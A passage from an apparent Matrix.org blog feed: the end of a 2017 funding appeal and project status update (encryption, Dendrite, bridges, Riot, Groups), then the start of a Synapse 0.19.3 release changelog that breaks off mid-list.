&lt;p&gt;&lt;b&gt;So we need help from the community to keep going!  &lt;&#x2F;b&gt;&lt;b&gt;Please head over to &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon&lt;&#x2F;a&gt;&lt;&#x2F;b&gt;&lt;b&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&#x2F;&quot;&gt;Liberapay &lt;&#x2F;a&gt;and put some money in the meter &lt;&#x2F;b&gt;(or send some bitcoin to 1LxowEgsquZ3UPZ68wHf8v2MDZw82dVmAE or ether to 0xA5f9a4f9E024F6D727f7afdA9257e22329A97485)&lt;b&gt;.&lt;&#x2F;b&gt; In return, you&#x27;ll get to keep Matrix evolving at a decent rate, be a member of the upcoming &lt;code&gt;+supporters:matrix.org&lt;&#x2F;code&gt; group (complete with flair badges!), and other benefits like access to #matrix-supporters:matrix.org - a new dedicated room for prioritised support, discounted goodies from Riot once paid services arrive, access to a weekly supporters-only status podcast(!), and of course receive our eternal thanks. :)&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, &lt;b&gt;if you&#x27;re a company who depends on Matrix&lt;&#x2F;b&gt;: &lt;a href=&quot;mailto:matthew@matrix.org&quot;&gt;please get in touch&lt;&#x2F;a&gt;. We have the option for you to sponsor core Matrix development (e.g. Dendrite) or for us to provide you with more targeted support or feature development.  We&#x27;re already talking to several organisations who want to accelerate Dendrite specifically - and the more support we have there the faster we can go.&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;d also like to thank &lt;a href=&quot;https:&#x2F;&#x2F;upcloud.com&quot;&gt;UpCloud&lt;&#x2F;a&gt; for sponsoring hosting for the Matrix.org synapse instances - UpCloud has been coping impressively with the massive I&#x2F;O and CPU&#x2F;RAM requirements we have, and we recommend them unreservedly for &lt;a href=&quot;https:&#x2F;&#x2F;upcloud.com&#x2F;matrix&quot;&gt;folks looking to run their own homeservers&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, one of the longer term plans to help fund Matrix is to get sponsorship from Riot, once Riot starts offering paid services. So, &lt;b&gt;if you&#x27;re an investor who&#x27;s interested in the for-profit sides of Riot &lt;&#x2F;b&gt;(paid integrations and paid Matrix hosting) then please &lt;a href=&quot;mailto:amandine@riot.im&quot;&gt;get in touch with the Riot team&lt;&#x2F;a&gt; ASAP!&lt;&#x2F;p&gt;
&lt;p&gt;Moving forward we are confident that we can secure funding, through sponsorship and Riot paid services, but in truth this decision caught us by surprise and so we need help both long term but also &lt;b&gt;&lt;i&gt;right now!&lt;&#x2F;i&gt;&lt;&#x2F;b&gt;&lt;&#x2F;p&gt;
&lt;p&gt;And whatever the funding situation, we&#x27;re of course always looking for contributions for code, bug reports, or just spreading the word about the project too! :)&lt;&#x2F;p&gt;
&lt;h2 id=&quot;status-update&quot;&gt;Status Update&lt;&#x2F;h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;(or scroll to next section to see why this is bigger than &amp;quot;just&amp;quot; decentralised encrypted communication)&lt;&#x2F;em&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Despite the funding issue, the project really is going very well. Our vital stats (as seen through the lens of the matrix.org synapse) are looking like this:&lt;&#x2F;p&gt;
&lt;img class=&quot;aligncenter size-large wp-image-2587&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;07&#x2F;Screen-Shot-2017-07-06-at-14.36.42-1024x780.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;780&quot; &#x2F;&gt;
&lt;img class=&quot;aligncenter size-large wp-image-2585&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;07&#x2F;Screen-Shot-2017-07-06-at-14.50.15-1024x918.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;918&quot; &#x2F;&gt;
&lt;img class=&quot;aligncenter size-large wp-image-2588&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;07&#x2F;Screen-Shot-2017-07-06-at-15.45.37-1024x694.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;694&quot; &#x2F;&gt;
&lt;p&gt;And meanwhile, looking back at the last big update (&lt;a href=&quot;&#x2F;blog&#x2F;2016&#x2F;12&#x2F;26&#x2F;the-matrix-holiday-special-2016-edition&#x2F;&quot;&gt;Holiday Special 2016&lt;&#x2F;a&gt;), we can compare our progress with our goals for 2017 thus far:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Getting E2E Encryption out of beta ASAP.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
This has progressed massively - we haven&#x27;t really yelled about it yet, but latest https:&#x2F;&#x2F;riot.im&#x2F;develop&#x2F; now finally implements the ability to share message keys between clients to let them decrypt older history and fix “unable to decrypt” errors (Mobile coming soon).  Meanwhile various root causes of “unable to decrypt” errors have been gradually eliminated; I can&#x27;t actually remember the last time I saw one! Once key-sharing and improved device verification UX is fully tested and tuned we should be able to declare E2E out of beta.
&lt;blockquote&gt;
&lt;p dir=&quot;ltr&quot; lang=&quot;en&quot;&gt;Work on fixing the final causes of &quot;unable to decrypt&quot; (UISI) errors in E2E is progressing well: here&#x27;s a sneak preview of things to come!! &lt;a href=&quot;https:&#x2F;&#x2F;t.co&#x2F;0oGJjm8ZHT&quot;&gt;pic.twitter.com&#x2F;0oGJjm8ZHT&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;— Matrix (@matrixdotorg) &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;867719250194071552&quot;&gt;May 25, 2017&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Ensuring we can scale beyond Synapse – i.e. implement Dendrite&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Likewise, Dendrite is on track: we&#x27;ve implemented all the Hard Stuff which forms the skeleton of Dendrite (core federation, message signing, &#x2F;sync, message sending, media repository etc) - which takes us to over &lt;a href=&quot;https:&#x2F;&#x2F;docs.google.com&#x2F;spreadsheets&#x2F;d&#x2F;1tkMNpIpPjvuDJWjPFbw_xzNzOHBA-Hp50Rkpcr43xTw&#x2F;edit&quot;&gt;50% of Phase 1&lt;&#x2F;a&gt;. After phase 1, we will have an initial usable release for all the core functionality.  Synapse&#x27;s performance has also improved enormously this year.
&lt;blockquote&gt;
&lt;p dir=&quot;ltr&quot; lang=&quot;en&quot;&gt;New milestone for Dendrite: sending messages over federation BOTH WAYS between dendrite &amp; synapse! A bit more polish &amp; we can cut an alpha!! &lt;a href=&quot;https:&#x2F;&#x2F;t.co&#x2F;DWs6rFqZcQ&quot;&gt;pic.twitter.com&#x2F;DWs6rFqZcQ&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;— Matrix (@matrixdotorg) &lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;matrixdotorg&#x2F;status&#x2F;878279397106733056&quot;&gt;June 23, 2017&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Getting as many bots and bridges into Matrix as possible, and doing everything we can to support them, host them and help them be as high quality as possible – making the public federated Matrix network as useful and diverse as possible.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bridges and bots continue - from the core team we have a ‘puppeting&#x27; Telegram bridge (&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-appservice-tg&quot;&gt;matrix-appservice-tg&lt;&#x2F;a&gt;), and from the wider community we have &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Half-Shot&#x2F;matrix-appservice-discord&quot;&gt;Discord&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-hacks&#x2F;matrix-puppet-skype&quot;&gt;Skype&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-hacks&#x2F;matrix-puppet-signal&quot;&gt;Signal&lt;&#x2F;a&gt;, new Rocket.Chat and more.  Getting them polished and live is certainly an area where we need more manpower though.
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Supporting Riot&#x27;s leap to the mainstream, ensuring Matrix has at least one killer app.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Riot has been &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-web-and-desktop-version-0-10-0-is-here-e6147f5f576f&quot;&gt;sprouting&lt;&#x2F;a&gt; &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-web-0-11-is-here-3edbf9dbb7ed&quot;&gt;new releases&lt;&#x2F;a&gt; every few weeks, with a huge emphasis on proving UX:
&lt;ul&gt;
 	&lt;li style=&quot;padding-left: 30px;&quot;&gt;an entirely new streamlined sign-up process&lt;&#x2F;li&gt;
 	&lt;li style=&quot;padding-left: 30px;&quot;&gt;the new concept of home pages&lt;&#x2F;li&gt;
 	&lt;li style=&quot;padding-left: 30px;&quot;&gt;a user directory search that actually works&lt;&#x2F;li&gt;
 	&lt;li style=&quot;padding-left: 30px;&quot;&gt;internationalised to 27 languages&lt;&#x2F;li&gt;
 	&lt;li style=&quot;padding-left: 30px;&quot;&gt;compact layout&lt;&#x2F;li&gt;
 	&lt;li style=&quot;padding-left: 30px;&quot;&gt;loads of desktop improvements&lt;&#x2F;li&gt;
 	&lt;li style=&quot;padding-left: 30px;&quot;&gt;piwik analytics support; etc.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;img class=&quot;aligncenter size-large wp-image-2598&quot; src=&quot;&#x2F;blog&#x2F;wp-content&#x2F;uploads&#x2F;2017&#x2F;07&#x2F;Screen-Shot-2017-07-06-at-16.12.28-1024x566.png&quot; alt=&quot;&quot; width=&quot;1024&quot; height=&quot;566&quot; &#x2F;&gt;
&lt;p&gt;There is still a lot of UX work to be done, but it&#x27;s converging fast on being a great entry point into the Matrix ecosystem, driving its growth across different groups and communities..&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, a &lt;a href=&quot;https:&#x2F;&#x2F;medium.com&#x2F;@RiotChat&#x2F;riot-im-unveils-the-next-generation-of-its-mobile-client-6b38e2227ee2&quot;&gt;massive update to the iOS &amp;amp; Android apps&lt;&#x2F;a&gt; just landed yesterday, switching to an entirely new UI layout to separate People from Rooms, synchronized Read Markers, and more!&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Adding the final major missing features:&lt;&#x2F;em&gt;
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Customisable User Profiles (this is almost done, actually)&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
This is still hovering at ‘almost done&#x27;, and will be needed for some of the implementation of Groups (see below)..
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Groups (i.e. ability to define groups of users, and perform invites, powerlevels, etc. per-group as well as per-user)&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Groups are also in testing in Synapse too!  These will probably be the single biggest change to Matrix that we&#x27;ve seen since E2E encryption landed: it changes the dynamic of the whole network, given users can explicitly declare allegiance to different groups, which in turn have their own home pages and directories etc.  It lets users form communities, and declare their participation in those communities (if desired), and also lets rooms be grouped together.  One of our single biggest requests has been &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;riot-web&#x2F;issues&#x2F;2454&quot;&gt;“subrooms”&lt;&#x2F;a&gt; and we&#x27;re incredibly excited to see how well Groups solve this.
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Threading&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Sadly no progress on Threading so far this year.
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Editable events (and Reactions)&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
We&#x27;re hoping to get looking at this (at last!) once Groups are done.
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Maturing and polishing the spec (we are way overdue a new release)&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
You&#x27;ll have noticed that in the “how many people work on Matrix?” stats above, we didn&#x27;t mention anyone working on the Spec.  Because right now there isn&#x27;t anyone explicitly maintaining it, unfortunately; updates are done best-effort when everyone&#x27;s primary responsibilities allow it.  That said, there&#x27;s quite a lot of good stuff currently &lt;a href=&quot;&#x2F;speculator&#x2F;spec&#x2F;HEAD&#x2F;client_server&#x2F;unstable.html&quot;&gt;unreleased on HEAD.&lt;&#x2F;a&gt; This is something which is obviously critical to fix once we have sustainable funding sorted again.  We can only apologise to folks like the &lt;a href=&quot;http:&#x2F;&#x2F;ruma.io&quot;&gt;Ruma&lt;&#x2F;a&gt; developers who have suffered from the spec lag. :(
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Improving VoIP – especially conferencing.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
VoIP is improving lots on iOS, thanks to Denis Morozov&#x27;s GSoC project, and meanwhile we have all new conferencing powered by Jitsi on the horizon in the next few weeks too.
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Reputation&#x2F;Moderation management (i.e. spam&#x2F;abuse filtering).&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Lots of thinking about this (see below), but no development yet.
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;Much-needed SDK performance work on matrix-{&#x27;{&#x27;}react,ios,android{&#x27;}&#x27;}-sdk.&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
About 40% of the desired performance work has happened here (although not all has gone live yet).
&lt;ul&gt;
 	&lt;li&gt;&lt;em&gt;…and a few other things which would be premature to mention right now. :D&lt;&#x2F;em&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
All will be revealed in the next week or two - but suffice it to say that Integrations are going to be getting a Lot More Useful™. :)
&lt;h2 id=&quot;reflections&quot;&gt;Reflections&lt;&#x2F;h2&gt;
&lt;p&gt;There are very very few people actually working professionally on trying to build general-purpose open communication networks and protocols.  There&#x27;s us, some &lt;a href=&quot;http:&#x2F;&#x2F;xmpp.org&quot;&gt;XMPP&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;ircv3.net&#x2F;&quot;&gt;IRCv3&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;gnu.io&#x2F;social&#x2F;&quot;&gt;GNU Social&lt;&#x2F;a&gt;&#x2F;&lt;a href=&quot;https:&#x2F;&#x2F;mastodon.social&quot;&gt;Mastodon&lt;&#x2F;a&gt; folks, &lt;a href=&quot;https:&#x2F;&#x2F;ring.cx&#x2F;&quot;&gt;GNU Ring&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;tox.chat&quot;&gt;Tox&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;briarproject.org&quot;&gt;Briar&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ssbc&quot;&gt;Secure Scuttlebutt&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;ipfs.io&quot;&gt;IPFS&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;status.im&quot;&gt;Status.im&lt;&#x2F;a&gt;, &lt;a href=&quot;http:&#x2F;&#x2F;ricochet.im&quot;&gt;Ricochet&lt;&#x2F;a&gt;… and that&#x27;s literally all the major projects I can think of (sorry if I missed you!).  There&#x27;s probably only 50 developers in total working in this domain as their day job.&lt;&#x2F;p&gt;
&lt;p&gt;Meanwhile, there are literally &lt;strong&gt;&lt;i&gt;hundreds of thousands &lt;&#x2F;i&gt;&lt;&#x2F;strong&gt;of folks trudging away building more and more near-indistinguishable proprietary closed communication systems - trapping users inside ever more silos and fragmenting the basic ability to communicate on the ‘net.  It&#x27;s like a world where the open web was pushed into a tiny underground resistance, and everyone else was trapped in the walled gardens of AOL and Compuserve (or more contemporarily: Facebook, Twitter, WhatsApp etc).&lt;&#x2F;p&gt;
&lt;p&gt;In other words: the whole world of decentralised communication desperately needs your support.  This is a clear case of user choice and freedom: to give users the ability to pick who they trust with their data and metadata, without being forced into unilaterally trusting the Silicon Valley megacorps.  And this, dear Reader, is your chance to fix the world for the greater good. Seriously, the Matrix team is one of a handful in the world in a position to continue to push things in the right direction and avoid us falling into a permanent dystopia where communication is even more closed and proprietary than the Public Telephone Network!&lt;&#x2F;p&gt;
&lt;p&gt;Finally, there&#x27;s an even bigger issue at stake here than open communication.  As an open network, people can literally publish whatever content they like into Matrix - same as the web or the internet itself.  As a result, there&#x27;s scope for spam; abusive&#x2F;malicious content; propaganda; and generally the whole spectrum of the best and worst of humanity.  Now, if we were a centralised system like Facebook, we might hire &lt;a href=&quot;https:&#x2F;&#x2F;www.theguardian.com&#x2F;news&#x2F;2017&#x2F;may&#x2F;21&#x2F;facebook-moderators-quick-guide-job-challenges&quot;&gt;thousands of content moderators&lt;&#x2F;a&gt; to frantically impose a rulebook on ‘acceptable&#x27; content.  Or we might build invisible filter-bubbles for our users based on their social graph, cocooning them from scary unfamiliar content outside their social circles and reinforcing their preconceptions (whilst the resulting self-affirmation keeps them coming back, viewing more and more ads).&lt;&#x2F;p&gt;
&lt;p&gt;But we&#x27;re decentralised, and we have no absolute moral arbiter, and nor should we - on an open network it should be up to users and users alone to define and manage their own worldview and alignment.  Plus we are not fiscally obligated to keep users coming back to view more ads no matter what.  Instead, we are forced to confront the fundamental problem: building tools which empower users to curate and visualise their own content filters; letting them filter out the stuff they&#x27;re not interested in or find repellant… while still helping them be aware of their own viewpoint and the shape of the world beyond it.  We haven&#x27;t really started building this yet, but in the long term our feeling is that these tools will literally be vital for the survival of the human race (e.g. exposing anti-climate-change propaganda for what it is or helping users opt out of World War 3) - let alone the success of decentralisation.  A world where users blindly consume propaganda is doomed, and it&#x27;s a fascinating situation that the same tools which will allow Matrix users to tune out the rooms, users and conversations they&#x27;re not interested in could be directly applied to the bigger global problem.&lt;&#x2F;p&gt;
&lt;p&gt;So: &lt;b&gt;Matrix needs you.&lt;&#x2F;b&gt; Please become a supporter on &lt;a href=&quot;https:&#x2F;&#x2F;patreon.com&#x2F;matrixdotorg&quot;&gt;Patreon &lt;&#x2F;a&gt;or &lt;a href=&quot;https:&#x2F;&#x2F;liberapay.com&#x2F;matrixdotorg&#x2F;&quot;&gt;Liberapay&lt;&#x2F;a&gt;, and help us save the world :)&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Matthew, Amandine &amp;amp; the whole Matrix.org team.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Synapse 0.19.3 released</title>
        <published>2017-03-21T00:00:00+00:00</published>
        <updated>2017-03-21T00:00:00+00:00</updated>
        <author>
          <name>Unknown</name>
        </author>
        <link rel="alternate" href="https://matrix.org/blog/2017/03/21/synapse-0-19-3-released/" type="text/html"/>
        <id>https://matrix.org/blog/2017/03/21/synapse-0-19-3-released/</id>
        
        <content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;We&#x27;ve released Synapse 0.19.3-rc2 as 0.19.3 with no changes. This is a slightly unusual release, as 0.19.3-rc2 dates from March 13th and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;compare&#x2F;672dcf5...d101488&quot;&gt;a lot of stuff&lt;&#x2F;a&gt; has landed on the develop branch since then - however, we&#x27;ll be releasing that as 0.20.0 once it&#x27;s ready. Instead, 0.19.3 has a set of intermediary performance and bug fixes; the only new feature is a set of admin APIs kindly contributed by &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;morteza-araby&quot;&gt;@morteza-araby&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;The changelog follows - please upgrade from https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse or your OS packages as normal :)&lt;&#x2F;p&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-19-3-2017-03-20&quot;&gt;Changes in synapse v0.19.3 (2017-03-20)&lt;&#x2F;h3&gt;
&lt;p&gt;No changes since v0.19.3-rc2&lt;&#x2F;p&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-19-3-rc2-2017-03-13&quot;&gt;Changes in synapse v0.19.3-rc2 (2017-03-13)&lt;&#x2F;h3&gt;
&lt;p&gt;Bug fixes:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Fix bug in handling of incoming device list updates over federation.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h3 id=&quot;changes-in-synapse-v0-19-3-rc1-2017-03-08&quot;&gt;Changes in synapse v0.19.3-rc1 (2017-03-08)&lt;&#x2F;h3&gt;
&lt;p&gt;Features:&lt;&#x2F;p&gt;
&lt;ul&gt;
 	&lt;li&gt;Add some administration functionalities. Thanks to &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;morteza-araby&quot;&gt;&lt;span class=&quot;ghh-user-x tooltipstered&quot; title=&quot;&quot;&gt;@morteza-araby&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;! (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1784&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1784&quot; data-id=&quot;199561652&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1784&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Changes:
&lt;ul&gt;
 	&lt;li&gt;Reduce database table sizes (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1873&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1873&quot; data-id=&quot;204670414&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1873&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1916&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1916&quot; data-id=&quot;207518205&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1916&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1923&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1923&quot; data-id=&quot;208136725&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1923&lt;&#x2F;a&gt;, &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1963&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1963&quot; data-id=&quot;211038447&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1963&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Update contrib&#x2F; to not use syutil. Thanks to &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;andrewshadura&quot;&gt;&lt;span class=&quot;ghh-user-x tooltipstered&quot; title=&quot;&quot;&gt;@andrewshadura&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;! (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1907&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1907&quot; data-id=&quot;207038123&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1907&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Don&#x27;t fetch current state when sending an event in common case (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1955&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1955&quot; data-id=&quot;210568365&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1955&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
Bug fixes:
&lt;ul&gt;
 	&lt;li&gt;Fix synapse_port_db failure. Thanks to &lt;a class=&quot;user-mention&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;Pneumaticat&quot;&gt;&lt;span class=&quot;ghh-user-x tooltipstered&quot; title=&quot;&quot;&gt;@Pneumaticat&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;! (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1904&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1904&quot; data-id=&quot;207022149&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1904&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix caching to not cache error responses (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1913&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1913&quot; data-id=&quot;207216238&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1913&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix APIs to make kick &amp; ban reasons work (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1917&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1917&quot; data-id=&quot;207542829&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1917&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bugs in the &#x2F;keys&#x2F;changes api (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1921&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1921&quot; data-id=&quot;207764068&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1921&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
 	&lt;li&gt;Fix bug where users couldn&#x27;t forget rooms they were banned from (PR &lt;a class=&quot;issue-link js-issue-link ghh-issue-x tooltipstered&quot; title=&quot;&quot; href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;pull&#x2F;1922&quot; data-url=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;issues&#x2F;1922&quot; data-id=&quot;207904548&quot; data-error-text=&quot;Failed to load issue title&quot; data-permission-text=&quot;Issue title is private&quot;&gt;#1922&lt;&#x2F;a&gt;)&lt;&#x2F;li&gt;
